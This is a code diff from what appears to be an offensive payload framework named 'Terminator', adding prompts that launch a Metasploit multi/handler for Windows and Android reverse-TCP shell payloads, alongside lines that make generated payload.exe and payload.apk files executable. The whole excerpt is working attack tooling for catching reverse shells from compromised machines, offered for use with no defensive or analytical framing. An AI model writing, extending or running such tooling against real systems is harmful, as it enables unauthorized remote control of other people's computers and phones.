@@ -293,10 +293,16 @@ Handler Details:
                 time.sleep(0.3)
                 os.system('chmod +x /root/.tmf/payload.exe > /dev/null 2>&1')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Handler...')
-                try:
-                    os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
-                except Exception:
-                    pass
+                metasploit = input(Fore.CYAN+'[?]'+Fore.RESET+' Do You Want To Use Metasploit? (More Effective) (Y/n): ').strip(" ")
+                if metasploit == 'y' or metasploit == 'Y':
+                    print(Fore.BLUE+'[*]'+Fore.RESET+' Loading Metasploit-Framework Console...')
+                    print(Fore.YELLOW+'[+]'+Fore.RESET+' Using: windows/shell/reverse_tcp...')
+                    os.system(f"sudo msfconsole -x 'use multi/handler; set payload windows/shell/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; exploit'")
+                else:
+                    try:
+                        os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
+                    except Exception:
+                        pass
         elif PAYLOAD == "payload/apk/android_reverse_shell":
             if LHOST == "" or LPORT == "":
                 print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
@@ -308,10 +314,16 @@ Handler Details:
                 time.sleep(0.3)
                 os.system('chmod +x /root/.tmf/payload.apk > /dev/null 2>&1')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Handler...')
-                try:
-                    os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
-                except Exception:
-                    pass
+                metasploit = input(Fore.CYAN+'[?]'+Fore.RESET+' Do You Want To Use Metasploit? (More Effective) (Y/n): ').strip(" ")
+                if metasploit == 'y' or metasploit == 'Y':
+                    print(Fore.BLUE+'[*]'+Fore.RESET+' Loading Metasploit-Framework Console...')
+                    print(Fore.YELLOW+'[+]'+Fore.RESET+' Using: android/shell/reverse_tcp')
+                    os.system(f"sudo msfconsole -x 'use multi/handler; set payload android/shell/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; exploit'")
+                else:
+                    try:
+                        os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
+                    except Exception:
+                        pass
         elif PAYLOAD == 'payload/alien/win_reverse_shell':
             if LHOST == "" or LPORT == "":
                 print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
